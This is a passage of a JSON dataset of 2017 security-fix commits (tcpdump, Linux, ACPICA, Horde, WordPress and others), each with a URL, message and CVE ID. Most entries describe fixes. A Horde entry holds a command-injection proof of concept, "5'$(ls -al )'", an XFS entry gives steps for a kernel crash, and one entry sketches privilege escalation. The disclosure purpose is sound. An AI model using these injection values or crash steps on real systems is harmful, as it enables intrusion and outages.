    "body": "Prevent reading past end of message in MSG_ReadBits. If read pastend of msg->data buffer (16348 bytes) the engine could SEGFAULT.Make MSG_WriteBits use an exact buffer overflow check instead ofpossibly failing with a few bytes left.",
    "cveIds": [
      "CVE-2017-11721"
    ],
    "cveIdsCount": 1
  },
  "30f802f9ef4673583dddc9786bca39d1a591eb4b30ed6e772523dd38fde912aa": {
    "url": "https://github.com/vstakhov/rspamd/releases/tag/1.6.3",
    "title": "",
    "body": "* [CritFix] Fix semicolons parsing in the content type* [Feature] Add EBL to the default config* [Feature] Allow to configure monitored* [Feature] Allow to skip specific hashes in fuzzy storage* [Feature] Multimap: checking of symbol options* [Feature] Redis settings: support checking multiple keys* [Fix] ARC: Fix Lua 5.3 compatibility; timestamp should be integer* [Fix] Avoid changing content-transfer-encoding header's value* [Fix] Don't use whitelist/greylist maps as regexp, but as map* [Fix] Fix get_content method* [Fix] Header checks: Fix get_raw_header method* [Fix] Header checks: REPLYTO_UNPARSEABLE rule* [Fix] Lua_http: freeing* [Fix] Milter headers: custom headers: removing headers* [Fix] Parse HREF urls without explicit prefix* [Fix] WHITE_ON_WHITE: Ensure score is matched to part that fired the rule* [WebUI] Escape strings inside HTML in history",
    "cveIds": [
      "CVE-2017-11737"
    ],
    "cveIdsCount": 1
  },
  "483054161b5bfc7f654de5e7bc720cd60e6bd394be6e596e7a4c455e23f5b6b4": {
    "url": "https://github.com/shadow-maint/shadow/commit/954e3d2e7113e9ac06632aee3c69b8d818cc8952",
    "title": "Fix buffer overflow if NULL line is present in db.",
    "body": "If ptr->line == NULL for an entry, the first cycle will exit,but the second one will happily write past entries buffer.We actually do not want to exit the first cycle prematurelyon ptr->line == NULL.Signed-off-by: Tomas Mraz <tmraz@fedoraproject.org>",
    "cveIds": [
      "CVE-2017-12424"
    ],
    "cveIdsCount": 1
  },
  "c5a5aa02e0d2cd179fde7bbc71632ca00027e5274f4bbf733c6942a9bdfac04d": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/5d0d76e88ee2d3236d7e032589d6f1d4ec5f7b1e",
    "title": "CVE-2017-13055/IS-IS: fix an Extended IS Reachability sub-TLV",
    "body": "In isis_print_is_reach_subtlv() one of the case blocks did not check thatthe sub-TLV \"V\" is actually present and could over-read the input buffer.Add a length check to fix that and remove a useless boundary check froma loop because the boundary is tested for the full length of \"V\" beforethe switch block.Update one of the prior test cases as it turns out it depended on thispreviously incorrect code path to make it to its own malformed structurefurther down the buffer, the bugfix has changed its output.This fixes a buffer over-read discovered by Bhargava Shastry,SecT/TU Berlin.Add a test using the capture file supplied by the reporter(s).",
    "cveIds": [
      "CVE-2017-13055"
    ],
    "cveIdsCount": 1
  },
  "219cd7b381716a25bd9b67d42dc9c53332daaa5da23f41d388e77c4fe36c2d61": {
    "url": "https://github.com/MISP/MISP/commit/6eba658d4a648b41b357025d864c19a67412b8aa",
    "title": "fix: Fixed a potential persistent cross site scripting in the comments",
    "body": "- new tag parser for the comments implemented- Parser now cleanly pre-constructs the replacement items after finding tag pairs- This only impacts users of the same instance, as comments are not synchronised- as reported by Jurgen Jans and Cedric Van Bockhaven from Deloitte",
    "cveIds": [
      "CVE-2017-13671"
    ],
    "cveIdsCount": 1
  },
  "154ffaec59671dbea334c8957468d8d3612b77408a59acaa858a1d7d5b7d5abb": {
    "url": "https://github.com/torvalds/linux/commit/bc3aae2bbac46dd894c89db5d5e98f7f0ef9e205",
    "title": "net: check and errout if res->fi is NULL when RTM_F_FIB_MATCH is set",
    "body": "Syzkaller hit 'general protection fault in fib_dump_info' bug oncommit 4.13-rc5..Guilty file: net/ipv4/fib_semantics.ckasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] SMP KASANModules linked in:CPU: 0 PID: 2808 Comm: syz-executor0 Not tainted 4.13.0-rc5 #1Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOSUbuntu-1.8.2-1ubuntu1 04/01/2014task: ffff880078562700 task.stack: ffff880078110000RIP: 0010:fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314RSP: 0018:ffff880078117010 EFLAGS: 00010206RAX: dffffc0000000000 RBX: 00000000000000fe RCX: 0000000000000002RDX: 0000000000000006 RSI: ffff880078117084 RDI: 0000000000000030RBP: ffff880078117268 R08: 000000000000000c R09: ffff8800780d80c8R10: 0000000058d629b4 R11: 0000000067fce681 R12: 0000000000000000R13: ffff8800784bd540 R14: ffff8800780d80b5 R15: ffff8800780d80a4FS: 00000000022fa940(0000) GS:ffff88007fc00000(0000)knlGS:0000000000000000CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033CR2: 00000000004387d0 CR3: 0000000079135000 CR4: 00000000000006f0Call Trace: inet_rtm_getroute+0xc89/0x1f50 net/ipv4/route.c:2766 rtnetlink_rcv_msg+0x288/0x680 net/core/rtnetlink.c:4217 netlink_rcv_skb+0x340/0x470 net/netlink/af_netlink.c:2397 rtnetlink_rcv+0x28/0x30 net/core/rtnetlink.c:4223 netlink_unicast_kernel net/netlink/af_netlink.c:1265 [inline] netlink_unicast+0x4c4/0x6e0 net/netlink/af_netlink.c:1291 netlink_sendmsg+0x8c4/0xca0 net/netlink/af_netlink.c:1854 sock_sendmsg_nosec net/socket.c:633 [inline] sock_sendmsg+0xca/0x110 net/socket.c:643 ___sys_sendmsg+0x779/0x8d0 net/socket.c:2035 __sys_sendmsg+0xd1/0x170 net/socket.c:2069 SYSC_sendmsg net/socket.c:2080 [inline] SyS_sendmsg+0x2d/0x50 net/socket.c:2076 entry_SYSCALL_64_fastpath+0x1a/0xa5 RIP: 0033:0x4512e9 RSP: 002b:00007ffc75584cc8 EFLAGS: 00000216 ORIG_RAX: 000000000000002e RAX: ffffffffffffffda RBX: 0000000000000002 RCX: 00000000004512e9 RDX: 0000000000000000 RSI: 0000000020f2cfc8 RDI: 0000000000000003 RBP: 000000000000000e R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000216 R12: fffffffffffffffe R13: 0000000000718000 R14: 0000000020c44ff0 R15: 0000000000000000 Code: 00 0f b6 8d ec fd ff ff 48 8b 85 f0 fd ff ff 88 48 17 48 8b 45 28 48 8d 78 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e cb 0c 00 00 48 8b 45 28 44 RIP: fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP: ffff880078117010---[ end trace 254a7af28348f88b ]---This patch adds a res->fi NULL check.example run:$ip route get 0.0.0.0 iif virt1-0broadcast 0.0.0.0 dev lo cache <local,brd> iif virt1-0$ip route get 0.0.0.0 iif virt1-0 fibmatchRTNETLINK answers: No route to hostReported-by: idaifish <idaifish@gmail.com>Reported-by: Dmitry Vyukov <dvyukov@google.com>Fixes: b617981 (\"net: ipv4: RTM_GETROUTE: return matched fib result when requested\")Signed-off-by: Roopa Prabhu <roopa@cumulusnetworks.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-13686"
    ],
    "cveIdsCount": 1
  },
  "6a9cbcb17178f59bcc1ecf96b058481448ad8712eec883b41ea5df09b7483e9a": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/a1eefe986065846b6c69dbc09afd9fa1a02c4a3d",
    "title": "CVE-2017-13687/CHDLC: Improve bounds and length checks.",
    "body": "Prevent a possible buffer overread in chdlc_print() and replace thecustom check in chdlc_if_print() with a standard check in chdlc_print()so that the latter certainly does not over-read even when reached viajuniper_chdlc_print(). Add length checks.",
    "cveIds": [
      "CVE-2017-13687"
    ],
    "cveIdsCount": 1
  },
  "9b8c667b4eff6de1034eb2d89af5257a134a02290e489ba08b41af454dbdf706": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/866c60236c41cea1e1654c8a071897292f64be49",
    "title": "CVE-2017-13687/CHDLC: Add a test.",
    "body": "This is for the fix made a few commits before, which had no tests.Add a test using the capture file supplied by Kamil Frankowicz.",
    "cveIds": [
      "CVE-2017-13687"
    ],
    "cveIdsCount": 1
  },
  "8bd759f1a407c5d523cae80f094ff29975957bab4f28743756b15e8cd3537023": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/0cb1b8a434b599b8d636db029aadb757c24e39d6",
    "title": "CVE-2017-13688/OLSR: Do bounds checks before we fetch data.",
    "body": "While we're at it, clean up some other bounds checks, so we check thatwe have a complete IPv4 message header if it's IPv4 and a complete IPv6message header if it's IPv6.This fixes a buffer over-read discovered by Bhargava Shastry,SecT/TU Berlin.Add tests using the capture files supplied by the reporter(s).",
    "cveIds": [
      "CVE-2017-13688"
    ],
    "cveIdsCount": 1
  },
  "ae4024fce7fe32703793e0f901e0c9f1b1b7c8dafed3658ab3312c9ffcf70d52": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/061e7371a944588f231cb1b66d6fb070b646e376",
    "title": "CVE-2017-13689/IKEv1: Fix addr+subnet length check.",
    "body": "An IPv6 address plus subnet mask is 32 bytes, not 20 bytes.16 bytes of IPv6 address, 16 bytes of subnet mask.This fixes a buffer over-read discovered by Bhargava Shastry,SecT/TU Berlin.Add a test using the capture file supplied by the reporter(s).",
    "cveIds": [
      "CVE-2017-13689"
    ],
    "cveIdsCount": 1
  },
  "c0c8a50c8b071fe95028f71842383c65e5d07c09bd260a7ca96e311e67f928de": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/8dca25d26c7ca2caf6138267f6f17111212c156e",
    "title": "CVE-2017-13690/IKEv2: Fix some bounds checks.",
    "body": "Use a pointer of the correct type in ND_TCHECK(), or use ND_TCHECK2()and provide the correct length.While we're at it, remove the blank line between some checks and theUNALIGNED_MEMCPY()s they protect.Also, note the places where we print the entire payload.This fixes a buffer over-read discovered by Bhargava Shastry,SecT/TU Berlin.Add a test using the capture file supplied by the reporter(s).",
    "cveIds": [
      "CVE-2017-13690"
    ],
    "cveIdsCount": 1
  },
  "023cc33338704dafa38faa0bd5dc8621075e5d84630f6079f95b3a6effaa4d20": {
    "url": "https://github.com/acpica/acpica/pull/295/commits/987a3b5cf7175916e2a4b6ea5b8e70f830dfe732",
    "title": "acpi: acpica: fix acpi operand cache leak in dswstate.c",
    "body": "I found an ACPI cache leak in ACPI early termination and boot continuing case.When early termination occurs due to malicious ACPI table, Linux kernelterminates ACPI function and continues to boot process. While kernel terminatesACPI function, kmem_cache_destroy() reports Acpi-Operand cache leak.Boot log of ACPI operand cache leak is as follows:>[ 0.585957] ACPI: Added _OSI(Module Device)>[ 0.587218] ACPI: Added _OSI(Processor Device)>[ 0.588530] ACPI: Added _OSI(3.0 _SCP Extensions)>[ 0.589790] ACPI: Added _OSI(Processor Aggregator Device)>[ 0.591534] ACPI Error: Illegal I/O port address/length above 64K: C806E00000004002/0x2 (20170303/hwvalid-155)>[ 0.594351] ACPI Exception: AE_LIMIT, Unable to initialize fixed events (20170303/evevent-88)>[ 0.597858] ACPI: Unable to start the ACPI Interpreter>[ 0.599162] ACPI Error: Could not remove SCI handler (20170303/evmisc-281)>[ 0.601836] kmem_cache_destroy Acpi-Operand: Slab cache still has objects>[ 0.603556] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.12.0-rc5 #26>[ 0.605159] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006>[ 0.609177] Call Trace:>[ 0.610063] ? dump_stack+0x5c/0x81>[ 0.611118] ? kmem_cache_destroy+0x1aa/0x1c0>[ 0.612632] ? acpi_sleep_proc_init+0x27/0x27>[ 0.613906] ? acpi_os_delete_cache+0xa/0x10>[ 0.617986] ? acpi_ut_delete_caches+0x3f/0x7b>[ 0.619293] ? acpi_terminate+0xa/0x14>[ 0.620394] ? acpi_init+0x2af/0x34f>[ 0.621616] ? __class_create+0x4c/0x80>[ 0.623412] ? video_setup+0x7f/0x7f>[ 0.624585] ? acpi_sleep_proc_init+0x27/0x27>[ 0.625861] ? do_one_initcall+0x4e/0x1a0>[ 0.627513] ? kernel_init_freeable+0x19e/0x21f>[ 0.628972] ? rest_init+0x80/0x80>[ 0.630043] ? kernel_init+0xa/0x100>[ 0.631084] ? ret_from_fork+0x25/0x30>[ 0.633343] vgaarb: loaded>[ 0.635036] EDAC MC: Ver: 3.0.0>[ 0.638601] PCI: Probing PCI hardware>[ 0.639833] PCI host bridge to bus 0000:00>[ 0.641031] pci_bus 0000:00: root bus resource [io 0x0000-0xffff]> ... Continue to boot and log is omitted ...I analyzed this memory leak in detail and found acpi_ds_obj_stack_pop_and_delete() function miscalculated the top of the stack. acpi_ds_obj_stack_push()function uses walk_state->operand_index for start position of the top, butacpi_ds_obj_stack_pop_and_delete() function considers index 0 for it.Therefore, this causes acpi operand memory leak.This cache leak causes a security threat because an old kernel (<= 4.9) showsmemory locations of kernel functions in stack dump. Some malicious userscould use this information to neutralize kernel ASLR.I made a patch to fix ACPI operand cache leak.Signed-off-by: Seunghun Han <kkamagui@gmail.com>",
    "cveIds": [
      "CVE-2017-13693"
    ],
    "cveIdsCount": 1
  },
  "0d7dccbbf6918dbd38d884ba7b7e5ea28d88a9c5d9fc693520cbd9a6994fc6c5": {
    "url": "https://github.com/acpica/acpica/pull/296/commits/37f2c716f2c6ab14c3ba557a539c3ee3224931b5",
    "title": "acpi: acpica: fix acpi operand cache leak in nseval.c",
    "body": "I found an ACPI cache leak in ACPI early termination and boot continuing case.When early termination occurs due to malicious ACPI table, Linux kernelterminates ACPI function and continues to boot process. While kernel terminatesACPI function, kmem_cache_destroy() reports Acpi-Operand cache leak.Boot log of ACPI operand cache leak is as follows:>[ 0.464168] ACPI: Added _OSI(Module Device)>[ 0.467022] ACPI: Added _OSI(Processor Device)>[ 0.469376] ACPI: Added _OSI(3.0 _SCP Extensions)>[ 0.471647] ACPI: Added _OSI(Processor Aggregator Device)>[ 0.477997] ACPI Error: Null stack entry at ffff880215c0aad8 (20170303/exresop-174)>[ 0.482706] ACPI Exception: AE_AML_INTERNAL, While resolving operands for [OpcodeName unavailable] (20170303/dswexec-461)>[ 0.487503] ACPI Error: Method parse/execution failed [\\DBG] (Node ffff88021710ab40), AE_AML_INTERNAL (20170303/psparse-543)>[ 0.492136] ACPI Error: Method parse/execution failed [\\_SB._INI] (Node ffff88021710a618), AE_AML_INTERNAL (20170303/psparse-543)>[ 0.497683] ACPI: Interpreter enabled>[ 0.499385] ACPI: (supports S0)>[ 0.501151] ACPI: Using IOAPIC for interrupt routing>[ 0.503342] ACPI Error: Null stack entry at ffff880215c0aad8 (20170303/exresop-174)>[ 0.506522] ACPI Exception: AE_AML_INTERNAL, While resolving operands for [OpcodeName unavailable] (20170303/dswexec-461)>[ 0.510463] ACPI Error: Method parse/execution failed [\\DBG] (Node ffff88021710ab40), AE_AML_INTERNAL (20170303/psparse-543)>[ 0.514477] ACPI Error: Method parse/execution failed [\\_PIC] (Node ffff88021710ab18), AE_AML_INTERNAL (20170303/psparse-543)>[ 0.518867] ACPI Exception: AE_AML_INTERNAL, Evaluating _PIC (20170303/bus-991)>[ 0.522384] kmem_cache_destroy Acpi-Operand: Slab cache still has objects>[ 0.524597] CPU: 1 PID: 1 Comm: swapper/0 Not tainted 4.12.0-rc5 #26>[ 0.526795] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006>[ 0.529668] Call Trace:>[ 0.530811] ? dump_stack+0x5c/0x81>[ 0.532240] ? kmem_cache_destroy+0x1aa/0x1c0>[ 0.533905] ? acpi_os_delete_cache+0xa/0x10>[ 0.535497] ? acpi_ut_delete_caches+0x3f/0x7b>[ 0.537237] ? acpi_terminate+0xa/0x14>[ 0.538701] ? acpi_init+0x2af/0x34f>[ 0.540008] ? acpi_sleep_proc_init+0x27/0x27>[ 0.541593] ? do_one_initcall+0x4e/0x1a0>[ 0.543008] ? kernel_init_freeable+0x19e/0x21f>[ 0.546202] ? rest_init+0x80/0x80>[ 0.547513] ? kernel_init+0xa/0x100>[ 0.548817] ? ret_from_fork+0x25/0x30>[ 0.550587] vgaarb: loaded>[ 0.551716] EDAC MC: Ver: 3.0.0>[ 0.553744] PCI: Probing PCI hardware>[ 0.555038] PCI host bridge to bus 0000:00> ... Continue to boot and log is omitted ...I analyzed this memory leak in detail and found AcpiNsEvaluate() functiononly removes Info->ReturnObject in AE_CTRL_RETURN_VALUE case. But, when errorsoccur, the status value is not AE_CTRL_RETURN_VALUE, and Info->ReturnObject isalso not null. Therefore, this causes acpi operand memory leak.This cache leak causes a security threat because an old kernel (<= 4.9) showsmemory locations of kernel functions in stack dump. Some malicious userscould use this information to neutralize kernel ASLR.I made a patch to fix ACPI operand cache leak.Signed-off-by: Seunghun Han <kkamagui@gmail.com>",
    "cveIds": [
      "CVE-2017-13695"
    ],
    "cveIdsCount": 1
  },
  "7ad27a5b35f6de59a2dc751275f8caa3420c1fc8ca2d66abe068d7f5cd9b18e0": {
    "url": "https://github.com/torvalds/linux/commit/a6e544b0a88b53114bfa5a57e21b7be7a8dfc9d0",
    "title": "flow_dissector: Jump to exit code in __skb_flow_dissect",
    "body": "Instead of returning immediately (on a parsing failure for instance) wejump to cleanup code. This always sets protocol values in key_control(even on a failure there is still valid information in the key_tags thatwas set before the problem was hit).Signed-off-by: Tom Herbert <tom@herbertland.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-13715"
    ],
    "cveIdsCount": 1
  },
  "b8f6c7b6bad6952ad3720d6b5bd4d6d805e999962eaa9fdf5d7ffd261ccc2417": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/c7c515ee03c285cc51376328de4ae9d549e501a5",
    "title": "CVE-2017-13725/IPv6 R.H.: Add a capture file.",
    "body": "This is from Kamil Frankowicz testing an existing fix.This is a test for the print-rt6.c fix I made after inspecting the code.",
    "cveIds": [
      "CVE-2017-13725"
    ],
    "cveIdsCount": 1
  },
  "36c1fe7fb8ebb7643725a381bcd55e5dd896f52992f72a21c7a1b130263ffe58": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/3c4d7c0ee30a30e5abff3d6d9586a3753101faf5",
    "title": "CVE-2017-13725/IPv6 R.H.: Check for the existence of all fields befor…",
    "body": "…e fetching them.Don't fetch the length field from the header until after we've checkedfor the existence of a field at or after that field.(Found by code inspection, not by a capture.)",
    "cveIds": [
      "CVE-2017-13725"
    ],
    "cveIdsCount": 1
  },
  "c9cde1a5a412168bb4f176eb2b6eb1a0b0ee6d019c47ad88999d2c239d56e1cf": {
    "url": "https://github.com/ARMmbed/mbedtls/commit/d15795acd5074e0b44e71f7ede8bdfe1b48591fc",
    "title": "Improve behaviour on fatal errors",
    "body": "If we didn't walk the whole chain, then there may be any kind of errors in thepart of the chain we didn't check, so setting all flags looks like the safething to do.",
    "cveIds": [
      "CVE-2017-14032"
    ],
    "cveIdsCount": 1
  },
  "490bdf68cd5c346908495d8cc6d2f684629ed2536d7739ebac0e8c23a305da32": {
    "url": "https://github.com/ARMmbed/mbedtls/commit/31458a18788b0cf0b722acda9bb2f2fe13a3fb32",
    "title": "Only return VERIFY_FAILED from a single point",
    "body": "Everything else is a fatal error. Also improve documentation about that forthe vrfy callback.",
    "cveIds": [
      "CVE-2017-14032"
    ],
    "cveIdsCount": 1
  },
  "6b176391ede55d0b08d2a95aa2d71d234b9a230531f80fe579e0a74aabdb672c": {
    "url": "https://github.com/uclouvain/openjpeg/commit/2cd30c2b06ce332dede81cccad8b334cde997281",
    "title": "tgatoimage(): avoid excessive memory allocation attempt, and fixes un…",
    "body": "…aligned load (#995)",
    "cveIds": [
      "CVE-2017-14040"
    ],
    "cveIdsCount": 1
  },
  "852fb8460e16dc87ddb6b5acbaa238a990af47ef029c58ef794fe8d34fe48fc2": {
    "url": "https://github.com/torvalds/linux/commit/197e7e521384a23b9e585178f3f11c9fa08274b9",
    "title": "Sanitize 'move_pages()' permission checks",
    "body": "The 'move_paghes()' system call was introduced long long ago with thesame permission checks as for sending a signal (except usingCAP_SYS_NICE instead of CAP_SYS_KILL for the overriding capability).That turns out to not be a great choice - while the system call reallyonly moves physical page allocations around (and you need othercapabilities to do a lot of it), you can check the return value to mapout some the virtual address choices and defeat ASLR of a binary thatstill shares your uid.So change the access checks to the more common 'ptrace_may_access()'model instead.This tightens the access checks for the uid, and also effectivelychanges the CAP_SYS_NICE check to CAP_SYS_PTRACE, but it's unlikely thatanybody really _uses_ this legacy system call any more (we hav ebetterNUMA placement models these days), so I expect nobody to notice.Famous last words.Reported-by: Otto Ebeling <otto.ebeling@iki.fi>Acked-by: Eric W. Biederman <ebiederm@xmission.com>Cc: Willy Tarreau <w@1wt.eu>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-14140"
    ],
    "cveIdsCount": 1
  },
  "2a05704132de4c8377770c07944734e2e3186ee1e55c7a6f4cf557825b586607": {
    "url": "https://github.com/torvalds/linux/commit/b31ff3cdf540110da4572e3e29bd172087af65cc",
    "title": "xfs: XFS_IS_REALTIME_INODE() should be false if no rt device present",
    "body": "If using a kernel with CONFIG_XFS_RT=y and we set the RHINHERIT flag ona directory in a filesystem that does not have a realtime device andcreate a new file in that directory, it gets marked as a real time file.When data is written and a fsync is issued, the filesystem attempts toflush a non-existent rt device during the fsync process.This results in a crash dereferencing a null buftarg pointer inxfs_blkdev_issue_flush(): BUG: unable to handle kernel NULL pointer dereference at 0000000000000008 IP: xfs_blkdev_issue_flush+0xd/0x20 ..... Call Trace: xfs_file_fsync+0x188/0x1c0 vfs_fsync_range+0x3b/0xa0 do_fsync+0x3d/0x70 SyS_fsync+0x10/0x20 do_syscall_64+0x4d/0xb0 entry_SYSCALL64_slow_path+0x25/0x25Setting RT inode flags does not require special privileges so anyunprivileged user can cause this oops to occur. To reproduce, confirmkernel is compiled with CONFIG_XFS_RT=y and run: # mkfs.xfs -f /dev/pmem0 # mount /dev/pmem0 /mnt/test # mkdir /mnt/test/foo # xfs_io -c 'chattr +t' /mnt/test/foo # xfs_io -f -c 'pwrite 0 5m' -c fsync /mnt/test/foo/barOr just run xfstests with MKFS_OPTIONS=\"-d rtinherit=1\" and wait.Kernels built with CONFIG_XFS_RT=n are not exposed to this bug.Fixes: f538d4d (\"[XFS] write barrier support\")Cc: <stable@vger.kernel.org>Signed-off-by: Richard Wareing <rwareing@fb.com>Signed-off-by: Dave Chinner <david@fromorbit.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-14340"
    ],
    "cveIdsCount": 1
  },
  "62f5793e4fc8163eea2796a2921f985e5ee1c718c93df07c98c96549a721cf9c": {
    "url": "https://github.com/torvalds/linux/commit/edbd58be15a957f6a760c4a514cd475217eb97fd",
    "title": "packet: Don't write vnet header beyond end of buffer",
    "body": "... which may happen with certain values of tp_reserve and maclen.Fixes: 58d19b1 (\"packet: vnet_hdr support for tpacket_rcv\")Signed-off-by: Benjamin Poirier <bpoirier@suse.com>Cc: Willem de Bruijn <willemb@google.com>Acked-by: Willem de Bruijn <willemb@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-14497"
    ],
    "cveIdsCount": 1
  },
  "ece64b6dbb07be072a635e29b21ee4ada57de26761f546fffa90d37de6132b05": {
    "url": "https://github.com/libarchive/libarchive/commit/5562545b5562f6d12a4ef991fae158bf4ccf92b6",
    "title": "Avoid a read off-by-one error for UTF16 names in RAR archives.",
    "body": "Reported-By: OSS-Fuzz issue 573",
    "cveIds": [
      "CVE-2017-14502"
    ],
    "cveIdsCount": 1
  },
  "d73028a0e44257b3c49ee6179fac4c905d4efafc7545707a51d54585413d56b1": {
    "url": "https://github.com/GNOME/nautilus/commit/1630f53481f445ada0a455e9979236d31a8d3bb0",
    "title": "mime-actions: use file metadata for trusting desktop files",
    "body": "Currently we only trust desktop files that have the executable bitset, and don't replace the displayed icon or the displayed name untilit's trusted, which prevents for running random programs by a maliciousdesktop file.However, the executable permission is preserved if the desktop filecomes from a compressed file.To prevent this, add a metadata::trusted metadata to the file once theuser acknowledges the file as trusted. This adds metadata to the file,which cannot be added unless it has access to the computer.Also remove the SHEBANG \"trusted\" content we were putting inside thedesktop file, since that doesn't add more security since it can comewith the file itself.https://bugzilla.gnome.org/show_bug.cgi?id=777991",
    "cveIds": [
      "CVE-2017-14604"
    ],
    "cveIdsCount": 1
  },
  "a62cd56bfc9cba57efdfc3b4db01cfa3059d22fcf186cc1997698c3b9c99fe75": {
    "url": "https://github.com/go-ldap/ldap/commit/95ede1266b237bf8e9aa5dce0b3250e51bfefe66",
    "title": "Merge pull request #126 from tiziano88/check_empty_password",
    "body": "Require explicit intention for empty password.",
    "cveIds": [
      "CVE-2017-14623"
    ],
    "cveIdsCount": 1
  },
  "8e8a3efd06a62f8c97fecaad68044e457b66e0db3805319fceabfcfb375dd3b5": {
    "url": "https://github.com/horde/horde/commit/eb3afd14c22c77ae0d29e2848f5ac726ef6e7c5b",
    "title": "Fix RCE in _raw() via $index parameter.",
    "body": "$index is passed down from getImageAtIndex($index).Luckily the only official horde code calling itis the PDF preview code with a fixed index of 0.Still code from third party vendors using the Horde framework libsmight expose getImageAtIndex() to the web.PoC:----------------<?php$options = array('index' => \"5'$(ls -al )'\");$max_pages = 10;// php fun: implicit conversion to integerif ($options['index'] < $max_pages){ // _raw() call in Im.php might look like // /usr/bin/convert \"/tmp/img1URPsC\"'[0]' -strip png:\"/tmp/img0NgHfI\" echo exec('echo \\'[' . $options['index'] . ']\\' ');}?>----------------Signed-off-by: Thomas Jarosch <thomas.jarosch@intra2net.com>Signed-off-by: Jan Schneider <jan@horde.org>",
    "cveIds": [
      "CVE-2017-14650"
    ],
    "cveIdsCount": 1
  },
  "8f22a0eb3ae67cc8d72399333a93f0a7076ab31de9627ad4ae50f7109184d225": {
    "url": "https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec",
    "title": "Database: Hardening to bring wpdb::prepare() inline with documentat…",
    "body": "…ion.`wpdb::prepare()` supports %s, %d, and %F as placeholders in the query string. Any other non-escaped % will be escaped.Built from https://develop.svn.wordpress.org/trunk@41496git-svn-id: http://core.svn.wordpress.org/trunk@41329 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-14723"
    ],
    "cveIdsCount": 1
  },
  "93293a438f563f25c271df67f1d451ff3ec23d3b3f6c4dd7db15198973dd827d": {
    "url": "https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48",
    "title": "Database: Hardening for wpdb::prepare()",
    "body": "Previously if you passed an array of values for placeholders, additional values could be passed as well. Now additional values will be ignored.Built from https://develop.svn.wordpress.org/trunk@41470git-svn-id: http://core.svn.wordpress.org/trunk@41303 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-14723"
    ],
    "cveIdsCount": 1
  },
  "20621e2c9e1bc286b04aa57ff6c0cb9b2792ed2df0cac76be0615b15a78565b9": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/c42a1388a6d1bfd8001bf6a4241d8ca27e49326d",
    "title": "avformat/rtpdec_h264: Fix heap-buffer-overflow",
    "body": "Fixes: rtp_sdp/poc.sdpFound-by: Bingchang <l.bing.chang.bc@gmail.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-14767"
    ],
    "cveIdsCount": 1
  },
  "9d792c079373a44a8f547ac44a1babe5a4e9807c0ce6d4aec410d8d65d4e60d8": {
    "url": "https://github.com/krb5/krb5/commit/fbb687db1088ddd894d975996e5f6a4252b9a2b4",
    "title": "Fix PKINIT cert matching data construction",
    "body": "Rewrite X509_NAME_oneline_ex() and its call sites to use dynamicallocation and to perform proper error checking.ticket: 8617target_version: 1.16target_version: 1.15-nexttarget_version: 1.14-nexttags: pullup",
    "cveIds": [
      "CVE-2017-15088"
    ],
    "cveIdsCount": 1
  },
  "baedea436a1f87806abacf2b5947e828c51962c042bd0832745c3b42dc16cbd1": {
    "url": "https://github.com/torvalds/linux/commit/2fae9e5a7babada041e2e161699ade2447a01989",
    "title": "usb: misc: legousbtower: Fix NULL pointer deference",
    "body": "This patch fixes a NULL pointer dereference caused by a race codition inthe probe function of the legousbtower driver. It re-structures theprobe function to only register the interface after successfully readingthe board's firmware ID.The probe function does not deregister the usb interface after an errorreceiving the devices firmware ID. The device file registered(/dev/usb/legousbtower%d) may be read/written globally before the probefunction returns. When tower_delete is called in the probe function(after an r/w has been initiated), core dev structures are deleted whilethe file operation functions are still running. If the 0 address ismappable on the machine, this vulnerability can be used to create aLocal Priviege Escalation exploit via a write-what-where condition byremapping dev->interrupt_out_buffer in tower_write. A forged USB deviceand local program execution would be required for LPE. The USB devicewould have to delay the control message in tower_probe and acceptthe control urb in tower_open whilst guest code initiated a write to thedevice file as tower_delete is called from the error in tower_probe.This bug has existed since 2003. Patch tested by emulated device.Reported-by: James Patrick-Evans <james@jmp-e.com>Tested-by: James Patrick-Evans <james@jmp-e.com>Signed-off-by: James Patrick-Evans <james@jmp-e.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2017-15102"
    ],
    "cveIdsCount": 1
  },
  "48b4900607540afc73cf0be1a16c3d57e23fe206585364e6ef364cf2ed38047b": {
    "url": "https://github.com/jdennis/keycloak-httpd-client-install/commit/c3121b271abaaa1a76de2b9ae89dacde0105cd75",
    "title": "CVE-2017-15112 unsafe use of -p/--admin-password on command line",
